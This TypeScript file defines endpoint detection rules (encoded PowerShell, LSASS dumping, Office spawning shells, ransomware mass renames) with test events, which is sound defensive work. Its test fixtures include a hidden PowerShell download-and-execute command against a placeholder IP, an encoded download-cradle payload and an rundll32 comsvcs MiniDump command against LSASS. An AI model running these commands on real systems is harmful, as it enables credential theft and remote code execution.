import type { DetectionRuleInput } from "../detection/types.js";

/**
 * Bloody built-in endpoint (EDR) detections. Written by Bloody detection engineering;
 * not derived from any third-party rule repository.
 */

const WIN = { asset: { hostname: "ws-test-01", os: "Windows 11 Enterprise" } };

export const ENCODED_POWERSHELL: DetectionRuleInput = {
  kind: "sigma",
  id: "bloody-edr-encoded-powershell",
  name: "PowerShell executed with an encoded command",
  description:
    "PowerShell started with -EncodedCommand (or any accepted abbreviation) and a Base64 payload. Attackers encode commands to hide intent from command-line logging and simple string matching.",
  version: 1,
  severity: "high",
  confidence: 0.75,
  attack: [
    { id: "T1059.001", name: "PowerShell", tactic: "execution" },
    { id: "T1027", name: "Obfuscated Files or Information", tactic: "defense-evasion" },
  ],
  tags: ["edr", "windows", "powershell"],
  author: "Bloody Detection Engineering",
  falsePositives: ["Configuration-management agents that ship encoded bootstrap scripts (tune with an entity suppression)."],
  sigma: String.raw`
title: PowerShell executed with an encoded command
id: 7f27bc76-72e5-4065-a834-00ee9657acc6
status: stable
description: PowerShell launched with an encoded command parameter followed by a Base64 payload.
author: Bloody Detection Engineering
logsource:
  category: process_creation
  product: windows
detection:
  powershell_binary:
    - Image|endswith:
        - '\powershell.exe'
        - '\pwsh.exe'
    - OriginalFileName:
        - 'PowerShell.EXE'
        - 'pwsh.dll'
  encoded_parameter:
    CommandLine|re|i: '\s[-/]e(c|n(c(o(d(e(d(c(o(m(m(a(n(d)?)?)?)?)?)?)?)?)?)?)?)?)?\s+[A-Za-z0-9+/]{20,}={0,2}'
  condition: powershell_binary and encoded_parameter
level: high
tags:
  - attack.execution
  - attack.t1059.001
`,
  tests: [
    {
      name: "abbreviated -enc with base64 payload",
      expect: "match",
      events: [
        {
          ...WIN,
          category: "process",
          process: {
            path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            commandLine: "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
          },
        },
      ],
    },
    {
      name: "pwsh with full -EncodedCommand",
      expect: "match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Program Files\\PowerShell\\7\\pwsh.exe", commandLine: "pwsh -EncodedCommand ZQBjAGgAbwAgACIAaABlAGwAbABvACIAOwBzAGwAZQBlAHAAIAAxADAA" } }],
    },
    {
      name: "execution policy bypass is not encoded",
      expect: "no_match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", commandLine: "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\inventory.ps1" } }],
    },
    {
      name: "other binaries with -enc are ignored",
      expect: "no_match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Tools\\encoder.exe", commandLine: "encoder.exe -enc QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB" } }],
    },
  ],
};

export const LSASS_CREDENTIAL_ACCESS: DetectionRuleInput = {
  kind: "sigma",
  id: "bloody-edr-lsass-credential-access",
  name: "LSASS memory access or dump",
  description:
    "A process opened LSASS with memory-read rights, or a known dumping technique (comsvcs MiniDump, procdump, lsass.dmp artifact) was used. Credential theft from LSASS precedes lateral movement.",
  version: 1,
  severity: "critical",
  confidence: 0.8,
  attack: [{ id: "T1003.001", name: "LSASS Memory", tactic: "credential-access" }],
  tags: ["edr", "windows", "credential-access"],
  author: "Bloody Detection Engineering",
  falsePositives: ["Security products and crash handlers not covered by the built-in filter."],
  sigma: String.raw`
title: LSASS memory access or dump
id: 96f1cc0b-59fe-4bee-a1ee-d25d0285d5c0
status: stable
description: Read access to LSASS process memory or creation of an LSASS dump.
author: Bloody Detection Engineering
logsource:
  product: windows
detection:
  sel_process_access:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1010'
      - '0x1410'
      - '0x1438'
      - '0x143a'
      - '0x1fffff'
  sel_comsvcs_minidump:
    CommandLine|contains|all:
      - 'comsvcs'
      - 'minidump'
  sel_procdump:
    Image|endswith:
      - '\procdump.exe'
      - '\procdump64.exe'
    CommandLine|contains: 'lsass'
  sel_dump_artifact:
    TargetFilename|endswith:
      - '\lsass.dmp'
      - '\lsass.zip'
  filter_trusted_accessors:
    Image|endswith:
      - '\MsMpEng.exe'
      - '\csrss.exe'
      - '\wininit.exe'
  condition: 1 of sel_* and not filter_trusted_accessors
level: critical
tags:
  - attack.credential-access
  - attack.t1003.001
`,
  tests: [
    {
      name: "rundll32 comsvcs MiniDump",
      expect: "match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Windows\\System32\\rundll32.exe", commandLine: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Temp\\out.bin full" } }],
    },
    {
      name: "unknown process opens LSASS with read rights",
      expect: "match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Users\\Public\\svc.exe" }, labels: { targetImage: "C:\\Windows\\System32\\lsass.exe", grantedAccess: "0x1010" } }],
    },
    {
      name: "Defender scanning LSASS is filtered",
      expect: "no_match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe" }, labels: { targetImage: "C:\\Windows\\System32\\lsass.exe", grantedAccess: "0x1010" } }],
    },
    {
      name: "query-only access is ignored",
      expect: "no_match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Windows\\System32\\taskmgr.exe" }, labels: { targetImage: "C:\\Windows\\System32\\lsass.exe", grantedAccess: "0x1000" } }],
    },
  ],
};

export const OFFICE_SPAWNS_SHELL: DetectionRuleInput = {
  kind: "sigma",
  id: "bloody-edr-office-spawns-shell",
  name: "Office application spawned a shell or script host",
  description: "An Office application started a command shell, script host or LOLBin — the typical execution chain of a malicious document or phishing attachment.",
  version: 1,
  severity: "high",
  confidence: 0.8,
  attack: [
    { id: "T1204.002", name: "Malicious File", tactic: "execution" },
    { id: "T1566.001", name: "Spearphishing Attachment", tactic: "initial-access" },
  ],
  tags: ["edr", "windows", "phishing"],
  author: "Bloody Detection Engineering",
  falsePositives: ["Line-of-business macros that legitimately call scripts (suppress per host)."],
  sigma: String.raw`
title: Office application spawned a shell or script host
id: b28fd129-8989-46d9-9dd1-92fc8754da13
status: stable
author: Bloody Detection Engineering
logsource:
  category: process_creation
  product: windows
detection:
  office_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\powerpnt.exe'
      - '\outlook.exe'
      - '\msaccess.exe'
      - '\mspub.exe'
      - '\onenote.exe'
  suspicious_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
  condition: office_parent and suspicious_child
level: high
tags:
  - attack.execution
  - attack.t1204.002
`,
  tests: [
    {
      name: "Word launches PowerShell",
      expect: "match",
      events: [
        {
          ...WIN,
          category: "process",
          process: { path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", commandLine: "powershell -w hidden -c iwr http://198.51.100.7/a.ps1|iex", parent: { path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" } },
        },
      ],
    },
    {
      name: "Excel launches mshta",
      expect: "match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Windows\\System32\\mshta.exe", parent: { path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" } } }],
    },
    {
      name: "Explorer launches cmd",
      expect: "no_match",
      events: [{ ...WIN, category: "process", process: { path: "C:\\Windows\\System32\\cmd.exe", parent: { path: "C:\\Windows\\explorer.exe" } } }],
    },
    {
      name: "Linux host is out of logsource scope",
      expect: "no_match",
      events: [{ asset: { hostname: "lnx-01", os: "Ubuntu 22.04" }, category: "process", process: { path: "/tmp/cmd.exe", parent: { path: "/opt/winword.exe" } } }],
    },
  ],
};

const renameBurst = Array.from({ length: 60 }, (_, i) => ({
  ...WIN,
  category: "file",
  offsetSeconds: i * 0.5,
  process: { path: "C:\\Users\\Public\\locker.exe" },
  file: { path: `C:\\Shares\\Finance\\report-${i}.xlsx.locked`, action: "rename" },
}));
const renameSlow = renameBurst.map((e, i) => ({ ...e, offsetSeconds: i * 120 }));

export const RANSOMWARE_MASS_RENAME: DetectionRuleInput = {
  kind: "threshold",
  id: "bloody-edr-ransomware-mass-rename",
  name: "Mass file renaming consistent with ransomware",
  description: "More than 50 distinct files renamed on one host within 60 seconds — the encryption phase of ransomware renames files in bulk.",
  version: 1,
  severity: "critical",
  confidence: 0.7,
  attack: [{ id: "T1486", name: "Data Encrypted for Impact", tactic: "impact" }],
  tags: ["edr", "ransomware"],
  author: "Bloody Detection Engineering",
  falsePositives: ["Backup or sync clients reorganizing folders (suppress per process path)."],
  filter: { detection: { file_rename: { category: "file", "file.action": "rename" } }, condition: "file_rename" },
  groupBy: ["asset.hostname"],
  distinctField: "file.path",
  threshold: 50,
  windowSeconds: 60,
  cooldownSeconds: 600,
  tests: [
    { name: "60 renames in 30 seconds", expect: "match", expectedMatches: 1, events: renameBurst },
    { name: "60 renames spread over 2 hours", expect: "no_match", events: renameSlow },
  ],
};

export const ENDPOINT_RULES: DetectionRuleInput[] = [ENCODED_POWERSHELL, LSASS_CREDENTIAL_ACCESS, OFFICE_SPAWNS_SHELL, RANSOMWARE_MASS_RENAME];
